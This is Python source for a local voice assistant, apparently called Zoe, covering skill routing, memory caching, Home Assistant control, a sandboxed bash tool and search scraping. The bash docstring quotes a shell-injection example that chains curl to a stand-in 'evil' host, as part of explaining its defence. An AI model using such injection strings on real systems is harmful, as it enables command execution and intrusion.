_ALWAYS_ON_TOOLS: list[str] = ["web_search", "deep_web_research", "report_issue"]

_SKILL_KEYWORDS: dict[str, list[str]] = {
    "memory": [
        "remember", "forgot", "recall", "memory", "know about", "do you know",
        "did i tell", "have i told", "store", "save", "what do you know",
        "my name", "my favourite", "my favorite", "my preference", "my details",
        "my wife", "my husband", "my partner", "my kid", "my dog", "my cat",
        "my birthday", "i am allergic", "i live in", "i work",
        # Implicit disclosures — user is sharing info without asking to save it
        "i am", "i'm", "i feel", "i love", "i hate", "i prefer", "i like",
        "i don't like", "i never", "i always", "i usually", "i tend to",
        "my job", "my family", "my health", "my diet", "my routine",
        "i'm nervous", "i'm excited", "i'm worried", "i'm happy",
        "actually", "by the way", "just so you know", "you should know",
    ],
    "smart-home": [
        "light", "lights", "fan", "switch", "heater", "aircon", "air con",
        "tv", "television", "camera", "lock", "unlock", "door", "turn on",
        "turn off", "toggle", "dim", "brightness", "volume", "media player",
        "plug", "socket", "alarm", "garage", "blind", "curtain",
    ],
    "calendar": [
        "calendar", "event", "schedule", "appointment", "agenda", "meeting",
        "booking", "when is", "what's on", "what is on", "add event",
        "create event", "book", "today", "tomorrow", "this week", "next week",
    ],
    "reminders": [
        "remind", "reminder", "don't forget", "dont forget", "alert me",
        "notify me", "set a reminder", "reminders",
    ],
    "lists": [
        "shopping list", "grocery", "groceries", "shopping", "todo", "to do",
        "tasks", "add to", "add milk", "add eggs", "add bread", "buy ",
        "list", "wish list", "wishlist", "work list",
    ],
    "weather": [
        "weather", "rain", "sunny", "temperature", "forecast", "umbrella",
        "jacket", "hot today", "cold today", "wind", "storm", "humidity",
        "climate", "degrees", "raining", "cloudy",
    ],
    "touch": [
        "open the", "show the", "display the", "bring up", "pull up",
        "open calendar", "open reminders", "open weather", "open lists",
    ],
    "bash": [
        "run ", "execute", "install ", "check system", "disk space",
        "memory usage", "python3 ", "pip install", "ls ", "cat ",
        "systemctl", "uptime", "how much disk", "how much ram",
    ],
    "visual": [
        "map", "show on map", "directions", "where is", "chart", "graph",
        "plot", "visualise", "visualize", "data", "show me a chart",
        "bar chart", "line chart", "pie chart",
    ],
    "discovery": [
        "plugin", "skill", "capability", "what can you do", "what can zoe do",
        "capabilities", "install skill", "telegram", "discord", "notification",
        "openclaw", "open claw", "what can", "can you ", "is there a",
        "how do i", "can zoe",
    ],
    "openclaw-fallback": [
        "openclaw", "open claw", "browser automation", "login session",
        "authenticated session", "persistent session", "form fill",
        "screenshot", "playwright", "home assistant setup",
    ],
}


_INTENT_SKILL_MAP: dict[str, list[str]] = {
    "set_volume": ["smart-home"],
    "music_play": ["smart-home"], "music_control": ["smart-home"],
    "music_volume": ["smart-home"], "music_stop": ["smart-home"],
    "smart_home_control": ["smart-home"],
    "timer_set": ["reminders"], "reminder_create": ["reminders"],
    "calendar_add": ["calendar"],
    "note_create": ["memory"], "list_add": ["lists"],
    "weather_query": ["weather"],
    "calculate": [],  # no tool needed — fast path
    "greeting": [],
    "general_question": [],
}


def _select_skills(message: str) -> set[str]:
    """Keyword-based classifier: returns skill names needed for this message.

    Falls back to loading all skills when FORCE_FULL_CONTEXT=true (rollback escape hatch).
    Returns 'discovery' as a minimal fallback when no specific skill matches, so the
    model always has list_openclaw_skills available to communicate capability gaps.

    Also reads the [Intent hint: ...] prefix injected by Tier 0.5 classifier to pre-load
    the correct skill groups without keyword scanning.
    """
    if _FORCE_FULL_CONTEXT:
        return set(_SKILL_TOOLS.keys())

    skills: set[str] = set()

    # Extract and use Tier 0.5 hint if present (fast path — no keyword scan needed)
    _hint_match = re.match(r'^\[Intent hint:\s*(\w+),', message)
    if _hint_match:
        hint_intent = _hint_match.group(1)
        mapped = _INTENT_SKILL_MAP.get(hint_intent)
        if mapped is not None:
            skills.update(mapped)
            if not skills:
                skills.add("discovery")
            return skills
        # Unknown intent — fall through to keyword scan

    msg = message.lower()
    for skill, keywords in _SKILL_KEYWORDS.items():
        if any(kw in msg for kw in keywords):
            skills.add(skill)
    if not skills:
        skills.add("discovery")
    return skills


def _build_tools(skills: set[str]) -> list[dict]:
    """Build filtered tool list: always-on tools + tools for selected skill groups.

    escalate_to_hermes is gated dynamically — only included when Hermes is healthy
    (checked via _hermes_available() which reads _RUNTIME_HEALTH from main.py).
    """
    tool_names: set[str] = set(_ALWAYS_ON_TOOLS)
    if _hermes_available():
        tool_names.update(_ALWAYS_ON_TOOLS_HERMES)
    for skill in skills:
        tool_names.update(_SKILL_TOOLS.get(skill, []))
    if not _openclaw_execution_enabled():
        tool_names.discard("escalate_to_openclaw")
    return [t for t in _TOOLS if t["function"]["name"] in tool_names]


def _build_voice_tools(needs_tools: bool) -> list[dict]:
    """Build the compact voice tool list while respecting Hermes health."""
    tool_names = set(_VOICE_TOOLS if needs_tools else _VOICE_ALWAYS_TOOLS)
    if not _hermes_available():
        tool_names.discard("escalate_to_hermes")
    if not _openclaw_execution_enabled():
        tool_names.discard("escalate_to_openclaw")
    return [t for t in _TOOLS if t["function"]["name"] in tool_names]


def _build_prompt(
    message: str,
    *,
    username: str = "",
    user_id: str = "",
    portrait: str = "",
    memory_context: str = "",
    open_loops: str = "",
    pending_suggestions: str = "",
) -> str:
    """Build the user message with a dynamic context prefix using named memory blocks.

    Injecting datetime, user identity, portrait, and memory into the user message
    (rather than the system prompt) keeps the system prompt byte-identical across
    turns, allowing llama.cpp to reuse its KV cache — saving ~300ms of prefill.

    Uses Letta-style named blocks so the LLM can reference them by name:
    [ABOUT {name}] — synthesized portrait
    [OPEN LOOPS] — threads to follow up on
    [CURRENT CONTEXT] — datetime, emotional moments, recent memory
    """
    import datetime as _dt
    now = _dt.datetime.now()
    dt_line = now.strftime("%A, %d %B %Y — %I:%M %p")
    first_name = (username or user_id or "").split()[0] if (username or user_id) else ""
    user_line = (
        f"Logged in: {username} ({user_id})" if username
        else (f"Logged in: {user_id}" if user_id else "")
    )
    parts = []
    if portrait:
        block_name = f"ABOUT {first_name}" if first_name else "ABOUT"
        parts.append(f"[{block_name}]\n{portrait}")
    if open_loops:
        parts.append(f"[OPEN LOOPS — threads to follow up on]\n{open_loops}")
    if pending_suggestions:
        parts.append(f"[OFFER TO SAVE — mention naturally if appropriate]\n{pending_suggestions}")
    ctx_parts = [f"Date/time: {dt_line}"]
    if user_line:
        ctx_parts.append(user_line)
    if memory_context:
        ctx_parts.append(memory_context)
    parts.append(f"[CURRENT CONTEXT]\n" + "\n".join(ctx_parts))
    parts.append(message)
    return "\n\n".join(parts)


# ── Hard query detection ──────────────────────────────────────────────────────

_HARD_QUERY_WORDS = frozenset({
    "debug", "code", "algorithm", "step by step", "explain how", "why does",
    "analyse", "analyze", "research", "implement", "compare and contrast",
    "write a program", "script", "function", "class", "calculate", "derive",
    "pros and cons", "in detail", "comprehensive", "thorough", "deeply",
})


def _is_hard_query(message: str) -> bool:
    """Return True if this query warrants a larger token budget."""
    msg_lower = message.lower()
    return (
        len(message) > 250
        or any(kw in msg_lower for kw in _HARD_QUERY_WORDS)
    )


def _token_budget(message: str) -> int:
    """Choose max_tokens based on query complexity and hardware tier."""
    if _JETSON_MODE:
        return 1024 if _is_hard_query(message) else 512
    return 512 if _is_hard_query(message) else 256


# ── Fast path ─────────────────────────────────────────────────────────────────

def _check_fast_response(message: str) -> str | None:
    """Return an instant response for simple queries that don't need an LLM."""
    import datetime
    msg = message.lower().strip(" ?.")
    now = datetime.datetime.now()
    words = set(msg.split())  # whole-word matching to avoid "times" → "time"

    # Instant greetings — no LLM needed
    _greeting_set = {"hi", "hey", "hello", "yo", "hiya", "howdy",
                     "hey zoe", "hi zoe", "hello zoe", "hey there"}
    if msg in _greeting_set:
        return "Hey! What can I help you with?"

    # Instant acknowledgements — no LLM needed
    _ack_set = {"thanks", "thank you", "cheers", "ty", "thx",
                "great", "perfect", "awesome", "nice", "cool",
                "got it", "ok", "okay", "sounds good", "good"}
    if msg in _ack_set:
        return "Glad to help! Anything else?"

    # Time queries — only if "time" is an actual word (not inside "times", "sometimes" etc.)
    if "time" in words or "clock" in words:
        if any(w in msg for w in ("what", "tell", "current", "now")):
            return f"It's {now.strftime('%-I:%M %p')}."
    if msg in ("time", "the time", "current time", "what time", "clock"):
        return f"It's {now.strftime('%-I:%M %p')}."

    # Date queries — match several natural phrasings
    _date_triggers = {
        "what day is it", "what's the date", "whats the date",
        "what is today", "what date is it", "today's date", "today",
        "what day is it today", "what is the date today", "what is todays date",
        "what is today's date", "what day is today",
    }
    if msg in _date_triggers or ("date" in words and "what" in words) or \
       ("day" in words and "today" in words):
        spoken_day = _spoken_day_ordinal(now.day)
        return f"Today is {now.strftime('%A')}, {now.strftime('%B')} {spoken_day}."

    # Identity/capability prompts - fast and Zoe-specific, avoiding model identity drift.
    _identity_triggers = {
        "who are you", "what are you", "who is zoe", "what is zoe",
        "tell me about yourself", "introduce yourself",
    }
    if msg in _identity_triggers:
        return "I'm Zoe, your local assistant. I can help with quick answers, household tasks, reminders, lists, weather, and deeper work when you need it."

    _capability_triggers = {
        "what can you do", "what can you help with", "how can you help",
        "what do you do", "what are your capabilities",
    }
    if msg in _capability_triggers:
        return "I can answer questions, manage reminders and lists, check weather and daily plans, help with smart-home tasks, and work with your local tools when you ask."

    # Lightweight curiosity prompts - keep this tiny and factual. Unknown topics fall through to the model.
    _interesting_match = re.match(
        r"^(?:tell me|give me|say) (?:something interesting|an interesting fact|a fun fact)(?: about (?P<topic>[a-z0-9 _-]+))?$",
        msg,
        re.IGNORECASE,
    )
    if _interesting_match:
        topic = (_interesting_match.group("topic") or "").strip().replace("_", " ")
        ocean_fact = "The oceans make more than half of Earth's oxygen, largely thanks to tiny drifting phytoplankton."
        facts = {
            "ocean": ocean_fact,
            "oceans": ocean_fact,
            "space": "Space is so quiet because sound needs particles to travel through, and space is almost a vacuum.",
            "dinosaurs": "Some dinosaurs had feathers, so birds are not just dinosaur relatives - they are living dinosaurs.",
            "bees": "Bees can recognise patterns and communicate food locations with a waggle dance.",
        }
        if not topic:
            return ocean_fact
        if topic in facts:
            return facts[topic]

    # Uptime / status
    _status_triggers = {
        "status", "are you running", "are you there", "you there", "ping",
        "are you online", "are you up", "you online", "are you working",
    }
    tier = "Jetson GPU" if _JETSON_MODE else "Pi 5"
    if msg in _status_triggers:
        return f"I'm here and running on your {tier}. How can I help?"

    return None


_FRUSTRATED_WORDS = {"ugh", "argh", "again", "still", "why", "broken", "useless",
                      "doesn't work", "not working", "wrong", "failed", "error"}
_SAD_WORDS = {"sad", "upset", "crying", "miss", "lonely", "tired", "exhausted",
               "overwhelmed", "anxious", "worried", "scared"}
_EXCITED_WORDS = {"awesome", "amazing", "great", "love it", "perfect", "excited",
                   "can't wait", "wonderful", "fantastic"}


def _classify_tone(text: str) -> str | None:
    """Return a short empathy prefix for emotional messages, or None."""
    lower = text.lower()
    if any(w in lower for w in _SAD_WORDS):
        return "I hear you. "
    if any(w in lower for w in _FRUSTRATED_WORDS):
        return "Let me sort that out. "
    if any(w in lower for w in _EXCITED_WORDS):
        return "That's great! "
    return None


def _model_url() -> str:
    return _GEMMA_URL


def _model_name() -> str:
    return "gemma-4-E4B-it-qat-UD-Q4_K_XL"


# ── MemPalace integration (Python API — no subprocess) ───────────────────────

# ── MemPalace wrappers (delegate to MemoryService) ────────────────────────────
#
# These three functions used to call ChromaDB directly, bypassing the
# MemoryService facade's safety rails (PII scrub, per-user lock, idempotency,
# audit). They now delegate to MemoryService so every write in the system has
# the same guarantees. Signatures and return shapes are preserved so callers
# (routers/chat.py, _dispatch_tool, _background_memory_save) don't change.
#
# Per-turn cache: `routers/chat.py` calls `_mempalace_load_user_facts` up to 6×
# per chat turn (once per model branch). A short TTL cache serves them all
# from one Chroma read, shaving 5–50 ms off the hot path. Writes invalidate
# the per-user entry so newly added facts surface on the next turn.

_USER_FACTS_CACHE: dict[tuple[str, int], tuple[float, str]] = {}
# The cold Chroma read is ~1.4s and sits on the voice brain turn's critical path.
# A 2s TTL expired during the wake→speak→STT gap, so every turn re-paid it. Fact
# WRITES invalidate the cache immediately (_invalidate_user_facts_cache), so a long
# TTL stays fresh while letting the wake-time warm survive until the turn fires.
_USER_FACTS_TTL_S: float = float(os.environ.get("PI_USER_FACTS_CACHE_TTL_S", "120.0"))


def _invalidate_user_facts_cache(user_id: str) -> None:
    for key in [key for key in _USER_FACTS_CACHE if key[0] == user_id]:
        _USER_FACTS_CACHE.pop(key, None)


async def _mempalace_search(
    query: str,
    user_id: str = "guest",
    limit: int = 5,
    timeout_s: float = 2.0,
) -> list[dict]:
    """Semantic search of this user's MemPalace facts via MemoryService.

    Returns the same list-of-dicts shape as before so callers in zoe_agent.py
    and _dispatch_tool don't have to change. Timeouts and failures are
    swallowed (logged at debug/warning) — memory is never fatal to a reply.
    """
    try:
        from memory_service import get_memory_service
        svc = get_memory_service()
        refs = await svc.search(
            query, user_id=user_id, limit=limit, timeout_s=timeout_s
        )
        return [
            {
                "id": r.id,
                "text": r.text,
                "content": r.text,
                "metadata": r.metadata,
                "score": r.score,
            }
            for r in refs
        ]
    except asyncio.TimeoutError:
        logger.debug("mempalace_search timed out after %.1fs — skipping", timeout_s)
        return []
    except ImportError:
        logger.warning("MemPalace not installed — memory search skipped")
        return []
    except Exception as exc:
        logger.warning("mempalace_search failed (non-fatal): %s", exc)
        return []


async def _mempalace_add(
    summary: str,
    user_id: str = "guest",
    tags: list[str] | None = None,
    added_by: str = "zoe_agent",
) -> bool:
    """Store a fact via MemoryService (PII scrubbed, idempotent, audit-logged).

    Returns True on success, False on any failure. Silent drops (PII reject,
    duplicate idempotency key) also return True because from the agent's
    perspective the memory "arrived" — it just didn't need a new row.
    """
    if not summary or not summary.strip():
        return False
    # Write-quality gate (mem0-style): reject conversational candidates that
    # aren't shaped like a storable personal fact (interrogatives, LLM meta-
    # rambling, empty/too-short) before they pollute the store. Conservative —
    # leans ACCEPT. Background path, never blocks a voice reply.
    try:
        from memory_quality import is_storable_fact
        storable, reason = is_storable_fact(summary)
        if not storable:
            logger.info("MEMORY_QUALITY_REJECT source=%s reason=%s text=%r",
                        added_by or "zoe_agent", reason, summary[:120])
            try:
                from memory_metrics import memory_quality_reject_count
                memory_quality_reject_count.labels(
                    source=added_by or "zoe_agent", reason=reason).inc()
            except Exception:
                pass
            return False
    except Exception:
        # If the gate itself errors, fall through and store — never lose a fact.
        pass
    try:
        from memory_service import get_memory_service, MemoryServiceError
        svc = get_memory_service()
        try:
            await svc.ingest(
                summary,
                user_id=user_id,
                source=added_by or "zoe_agent",
                tags=tags or [],
                memory_type="fact",
                confidence=0.7,
                status="approved",
            )
        except MemoryServiceError as exc:
            logger.warning("mempalace_add failed (non-fatal): %s", exc)
            return False
        # Invalidate the per-turn cache so the next turn sees this fact.
        _invalidate_user_facts_cache(user_id)
        return True
    except ImportError:
        logger.warning("MemPalace not installed — memory add skipped")
        return False
    except Exception as exc:
        logger.warning("mempalace_add failed (non-fatal): %s", exc)
        return False


async def _mempalace_load_user_facts(user_id: str, limit: int = 20) -> str:
    """Load a user's facts via MemoryService.load_for_prompt (metadata-only read).

    Cached for `_USER_FACTS_TTL_S` so the six per-turn callers in
    routers/chat.py share one Chroma read. Writes (`_mempalace_add`) pop the
    cache so freshness returns on the next turn.
    """
    now = time.monotonic()
    try:
        from memory_service import is_guest_memory_user
        if is_guest_memory_user(user_id):
            return ""
    except Exception:
        return ""
    cache_key = (user_id, limit)
    cached = _USER_FACTS_CACHE.get(cache_key)
    if cached is not None and cached[0] > now:
        return cached[1]

    try:
        from memory_service import get_memory_service
        svc = get_memory_service()
        refs = await svc.load_for_prompt(user_id, limit=limit + 10)
        if not refs:
            formatted = ""
        else:
            # Separate emotional moments from regular facts
            fact_refs = []
            emotional_refs = []
            for ref in refs:
                mt = (ref.metadata or {}).get("memory_type", "") or "" if hasattr(ref, "metadata") else getattr(ref, "memory_type", "") or ""
                tags_raw = (ref.metadata or {}).get("tags", "") or "" if hasattr(ref, "metadata") else getattr(ref, "tags", "") or ""
                tags = tags_raw if isinstance(tags_raw, list) else tags_raw.split(",")
                if mt == "emotional_moment" or "emotional" in tags:
                    emotional_refs.append(ref)
                else:
                    fact_refs.append(ref)

            sections = []

            # Facts block
            fact_lines = ["## What I know about you:"]
            for ref in fact_refs[:limit]:
                text = (ref.text or "")[:200]
                if text:
                    fact_lines.append(f"- {text}")
            if len(fact_lines) > 1:
                sections.append("\n".join(fact_lines))

            # Emotional moments block — most recent 5, helps Zoe follow up naturally
            if emotional_refs:
                import datetime as _dt
                now_dt = _dt.datetime.now(_dt.timezone.utc)
                emo_lines = ["## Recent emotional moments:"]
                for ref in emotional_refs[:5]:
                    text = (ref.text or "")[:180]
                    if not text:
                        continue
                    # Approximate age from added_at metadata if available
                    added_at = ((ref.metadata or {}).get("added_at", "") or "") if hasattr(ref, "metadata") else (getattr(ref, "added_at", "") or "")
                    age_str = ""
                    if added_at:
                        try:
                            added_dt = _dt.datetime.fromisoformat(added_at.replace("Z", "+00:00"))
                            if added_dt.tzinfo is None:
                                added_dt = added_dt.replace(tzinfo=_dt.timezone.utc)
                            else:
                                added_dt = added_dt.astimezone(_dt.timezone.utc)
                            delta = now_dt - added_dt
                            if delta.days == 0:
                                age_str = "today"
                            elif delta.days == 1:
                                age_str = "yesterday"
                            elif delta.days < 7:
                                age_str = f"{delta.days} days ago"
                            elif delta.days < 30:
                                age_str = f"{delta.days // 7} week{'s' if delta.days >= 14 else ''} ago"
                            else:
                                age_str = f"{delta.days // 30} month{'s' if delta.days >= 60 else ''} ago"
                        except Exception:
                            pass
                    prefix = f"[{age_str}] " if age_str else ""
                    emo_lines.append(f"- {prefix}{text}")
                if len(emo_lines) > 1:
                    sections.append("\n".join(emo_lines))

            formatted = "\n\n".join(sections)

        _USER_FACTS_CACHE[cache_key] = (now + _USER_FACTS_TTL_S, formatted)
        return formatted
    except ImportError:
        logger.warning("MemPalace not installed — skipping user facts load")
        return ""
    except Exception as exc:
        logger.debug("_mempalace_load_user_facts failed (non-fatal): %s", exc)
        return ""


# Keywords that suggest the message benefits from memory context retrieval.
# Queries without these skip MemPalace semantic search (saves 1-25s of ONNX inference time).
# Note: _mempalace_load_user_facts() (fast metadata filter) runs on EVERY turn regardless.
# The memory-recall keyword gate lives in memory_gate (single source of truth,
# shared with routers/memories.py's /for-prompt endpoint so the two can't diverge).
from memory_gate import (  # noqa: E402
    MEMORY_TRIGGER_WORDS as _MEMORY_TRIGGER_WORDS,
    message_needs_memory as _message_needs_memory,
)


async def _build_memory_context(message: str, user_id: str = "guest") -> str:
    """Semantic search of user's MemPalace facts — keyword-gated to avoid ONNX cost on every turn.

    Only runs for messages containing _MEMORY_TRIGGER_WORDS.
    The fast _mempalace_load_user_facts() is called separately and always runs.

    Additionally, if a proper name appears in the message, performs a targeted
    entity-type-filtered search to pull person-specific facts.
    """
    if not _message_needs_memory(message):
        return ""
    try:
        from memory_service import is_guest_memory_user
        if is_guest_memory_user(user_id):
            return ""
    except Exception:
        return ""
    _mp_timeout = 5.0 if _JETSON_MODE else 3.0

    # Standard semantic search
    memories = await _mempalace_search(message, user_id=user_id, limit=5, timeout_s=_mp_timeout)

    # Person-entity search: if a proper name is mentioned, pull their facts
    person_ctx = ""
    try:
        name_match = re.search(r'\b([A-Z][a-z]{2,20})\b', message)
        if name_match:
            person_name = name_match.group(1)
            # Skip common non-names
            _skip = {"Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday",
                     "January", "February", "March", "April", "June", "July", "August",
                     "September", "October", "November", "December", "Zoe"}
            if person_name not in _skip:
                person_mems = await _mempalace_search(
                    person_name, user_id=user_id, limit=5, timeout_s=_mp_timeout
                )
                person_facts = [
                    m for m in (person_mems or [])
                    if m.get("entity_type") in ("person", "person_pending")
                    and person_name.lower() in (m.get("text") or "").lower()
                ]
                if person_facts:
                    lines = [f"## What I know about {person_name}:"]
                    lines += [f"- {(m.get('text') or str(m))[:200]}" for m in person_facts]
                    person_ctx = "\n".join(lines)
    except Exception:
        pass

    if not memories and not person_ctx:
        return ""

    result_lines = []
    if memories:
        result_lines.append("## Relevant memories (semantic match):")
        for m in memories:
            content = m.get("text") or m.get("content") or m.get("summary") or str(m)
            result_lines.append(f"- {content[:200]}")
    if person_ctx:
        result_lines.append(person_ctx)
    return "\n".join(result_lines)


async def _load_pending_suggestions(user_id: str, session_id: str, limit: int = 3) -> str:
    try:
        from pending_suggestions import load_for_prompt
        return await load_for_prompt(user_id, session_id, limit=limit)
    except Exception:
        return ""


async def _load_open_loops(user_id: str, limit: int = 5) -> str:
    """Load active (unresolved) open loops for a user from SQLite.

    Returns a formatted string for injection into the [OPEN LOOPS] named block.
    """
    try:
        from db_compat import get_compat_db as _get_compat_db
        async with _get_compat_db() as _db:
            async with _db.execute(
                """SELECT loop_text, follow_up_hint, emotional_weight
                   FROM open_loops
                   WHERE user_id = ? AND resolved = 0
                   ORDER BY emotional_weight DESC, created_at DESC
                   LIMIT ?""",
                (user_id, limit),
            ) as cur:
                rows = await cur.fetchall()
        if not rows:
            return ""
        lines = []
        for r in rows:
            weight = r["emotional_weight"] or 1
            prefix = "⚡ " if weight >= 4 else ""
            lines.append(f"- {prefix}{r['loop_text']}")
            if r["follow_up_hint"]:
                lines.append(f"  → {r['follow_up_hint']}")
        return "\n".join(lines)
    except Exception:
        return ""


# ── Portrait & context enhancement ───────────────────────────────────────────

# Portrait is cached briefly so repeat turns in the same second don't hit SQLite
_PORTRAIT_CACHE: dict[str, tuple[float, str]] = {}
_PORTRAIT_TTL_S = 300.0  # 5 minutes


async def _load_user_portrait(user_id: str) -> str:
    """Load portrait text for a user from SQLite (cached 5 min).

    Returns '' if no portrait exists yet. Portrait is generated weekly by
    run_dreaming_cycle Phase 4 and stored in user_portraits table.
    Guests never receive portrait context (ZOE-4320).
    """
    if not user_id or user_id in ("guest", "anonymous"):
        return ""
    now = time.monotonic()
    cached = _PORTRAIT_CACHE.get(user_id)
    if cached is not None and cached[0] > now:
        return cached[1]
    try:
        from user_portrait import load_portrait  # type: ignore[import]
        text = await load_portrait(user_id)
        _PORTRAIT_CACHE[user_id] = (now + _PORTRAIT_TTL_S, text)
        return text
    except Exception as exc:
        logger.debug("portrait load failed (non-fatal) user=%s: %s", user_id, exc)
        return ""


# Patterns indicating the user wants help with something personal/stakes-bearing
# where enriching from the portrait would improve the response meaningfully.
_PERSONAL_REQUEST_PATTERNS = (
    # Writing on behalf of self
    "write", "draft", "help me write", "email to", "message to", "text to",
    # Decisions and advice
    "should i", "what should i", "how do i handle", "how should i", "advice",
    "what would you do", "not sure if i should", "thinking about",
    # Emotional stakes
    "i'm nervous", "i'm anxious", "i'm worried", "i'm stressed", "i'm scared",
    "i'm excited about", "i'm sad", "i feel", "feeling",
    # Representing self to others
    "for my interview", "for my presentation", "for my boss", "for my manager",
    "for my partner", "for my friend", "for my mum", "for my mom", "for my dad",
    # Reflection
    "reflect on", "help me think", "help me process", "what do you think about me",
)


def _is_personal_request(message: str) -> bool:
    """Return True if this message is a personal-stakes request that benefits from portrait context."""
    msg_lower = message.lower()
    return any(p in msg_lower for p in _PERSONAL_REQUEST_PATTERNS)


async def _context_enhance(message: str, portrait: str, user_id: str) -> str:
    """Generate a short perspective-enrichment block for personal requests.

    Makes a small focused LLM call (~100 tokens) that asks: given what we know
    about this person, what context is most relevant to this request?
    Returns a 2-3 sentence perspective context block, or '' if not applicable.
    """
    if not portrait or not _is_personal_request(message):
        return ""

    prompt = (
        f"Based on this understanding of the person:\n{portrait[:400]}\n\n"
        f"In 2-3 sentences, what personal context is most relevant to help them with this request?\n"
        f"Request: {message[:200]}\n\n"
        "Be specific. Focus on their communication style, current situation, or emotional context. "
        "Do NOT restate facts — synthesize what matters here. Return ONLY the 2-3 sentences, nothing else."
    )
    try:
        url = f"{_model_url()}/chat/completions"
        payload = {
            "model": _model_name(),
            "messages": [
                {"role": "system", "content": "You are a perceptive advisor. Be brief and specific."},
                {"role": "user", "content": prompt},
            ],
            "max_tokens": 120,
            "temperature": 0.5,
            "stream": False,
        }
        async with httpx.AsyncClient(timeout=15.0) as client:
            resp = await client.post(url, json=payload)
            resp.raise_for_status()
            text = (
                resp.json().get("choices", [{}])[0]
                .get("message", {})
                .get("content", "")
                .strip()
            )
        if text:
            return f"## Perspective context:\n{text}"
        return ""
    except Exception as exc:
        logger.debug("context_enhance failed (non-fatal): %s", exc)
        return ""


# ── HA control ───────────────────────────────────────────────────────────────

async def _ha_control(entity_id: str, action: str, data: dict | None = None) -> dict:
    """Call /devices/control on the HA bridge."""
    body = {"entity_id": entity_id, "action": action, "data": data or {}}
    try:
        async with httpx.AsyncClient(timeout=_TOOL_TIMEOUT) as client:
            r = await client.post(f"{_HA_BRIDGE}/devices/control", json=body)
            r.raise_for_status()
            return r.json()
    except httpx.ConnectError:
        return {"error": "HA bridge offline — is homeassistant-mcp-bridge running?"}
    except Exception as exc:
        return {"error": str(exc)}


# ── Bash self-extension ───────────────────────────────────────────────────────

async def _bash(command: str) -> str:
    """Run an allowed bash command and return stdout (max 2000 chars).

    Safety: the command is validated against the prefix allowlist AND parsed
    into an argv list (``agent_safety.check_bash_command``), then executed with
    ``create_subprocess_exec`` — i.e. NO shell. This neutralises shell-injection
    (``echo ok; curl http://evil`` no longer chains commands: ``curl`` becomes
    an inert literal argument to ``echo``), while every legitimate allowlisted
    command still works.
    """
    try:
        argv = check_bash_command(command, _BASH_ALLOWED_PREFIXES)
    except CommandRejected as exc:
        return f"[bash blocked: {exc}]"
    try:
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                *argv,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            ),
            timeout=15.0,
        )
        stdout, _ = await proc.communicate()
        output = stdout.decode(errors="replace")[:2000]
        return output or "(no output)"
    except asyncio.TimeoutError:
        return "[bash timeout after 15s]"
    except Exception as exc:
        return f"[bash error: {exc}]"


def _read_bounded_url_response(resp, max_bytes: int) -> bytes:
    content_length = resp.headers.get("Content-Length") if hasattr(resp, "headers") else None
    if content_length:
        try:
            declared_length = int(content_length)
        except (TypeError, ValueError):
            declared_length = None
        if declared_length is not None and declared_length > max_bytes:
            raise ValueError(f"response body exceeds {max_bytes} byte cap")

    chunks: list[bytes] = []
    total = 0
    while total <= max_bytes:
        chunk = resp.read(min(65536, max_bytes + 1 - total))
        if not chunk:
            break
        total += len(chunk)
        if total > max_bytes:
            raise ValueError(f"response body exceeds {max_bytes} byte cap")
        chunks.append(chunk)
    return b"".join(chunks)


def _ddg_search_sync(query: str, max_results: int = 5, timeout_s: float = 10.0) -> list[dict]:
    """Synchronous DuckDuckGo search using the duckduckgo-search library.

    Returns dicts with keys: title, href, body (duckduckgo-search native format).
    Falls back to HTML scraping if the library is unavailable.
    """
    try:
        from ddgs import DDGS
        with DDGS(timeout=int(timeout_s)) as ddgs:
            return list(ddgs.text(query, max_results=max_results)) or []
    except Exception:
        pass

    # Fallback: HTML scraping path (kept for resilience)
    from urllib.request import Request, urlopen
    from urllib.parse import quote_plus
    import re

    # Rotate through a few realistic UA strings to reduce bot blocking
    _UA = (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )
    _RESULT_PATTERNS = [
        # DDG HTML standard
        re.compile(
            r'class="result__a"[^>]*href="(?P<href>[^"]+)"[^>]*>(?P<title>[^<]+)</a>'
            r'.*?class="result__snippet"[^>]*>(?P<snippet>[^<]{10,300})',
            re.S,
        ),
        # DDG Lite
        re.compile(
            r'<a[^>]+href="(?P<href>https?://[^"]+)"[^>]*>(?P<title>[^<]{5,120})</a>'
            r'(?:[^<]*<[^>]+>){0,6}(?P<snippet>[A-Z][^<]{20,250})',
            re.S,
        ),
    ]

    endpoints = [
        f"https://html.duckduckgo.com/html/?q={quote_plus(query)}",
        f"https://lite.duckduckgo.com/lite/?q={quote_plus(query)}",
    ]
    headers = {
        "User-Agent": _UA,
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://duckduckgo.com/",
        "DNT": "1",
    }

    for url, pattern in zip(endpoints, _RESULT_PATTERNS):
        try:
            req = Request(url, headers=headers)
            with urlopen(req, timeout=timeout_s) as resp:
                body = _read_bounded_url_response(resp, _DDG_SEARCH_HTML_MAX_BYTES).decode(
                    "utf-8", errors="replace"
                )
            # DDG bot detection — skip if we got the challenge page
            if "anomaly.js" in body or len(body) < 3000:
                continue
            results = []
            for m in pattern.finditer(body):
                if len(results) >= max_results:
                    break
                href = m.group("href").strip()
                title = re.sub(r"<[^>]+>", "", m.group("title")).strip()
                snippet = re.sub(r"<[^>]+>", "", m.group("snippet")).strip()
                if href.startswith("http") and title and snippet:
                    results.append({"name": title, "value": snippet, "url": href})
            if results:
                return results
        except Exception:
            continue

    # Try research_evidence as last fallback
    try:
        from research_evidence import fetch_web_fallback_results  # type: ignore[import]
        results = fetch_web_fallback_results(query, max_results=max_results, timeout_s=timeout_s)
        if results:
            return results
    except Exception:
        pass

    return []


# ── Location resolution ───────────────────────────────────────────────────────

# Australian location: "Geraldton Western Australia" or "Geraldton WA"
# No IGNORECASE — requires Title Case city names so lowercase product words
# (e.g. "emu export blocks") don't get captured as part of the city.
_AU_LOCATION_RE = re.compile(
    r"\b(?P<city>[A-Z][a-zA-Z'-]+(?:\s+[A-Z][a-zA-Z'-]+){0,2})"
    r"\s*,?\s*"
    r"(?P<state>Western\s+Australia|New\s+South\s+Wales|South\s+Australia|"
    r"Northern\s+Territory|Australian\s+Capital\s+Territory|"
    r"Victoria|Queensland|Tasmania|WA|NSW|VIC|QLD|SA|TAS|NT|ACT)\b",
)

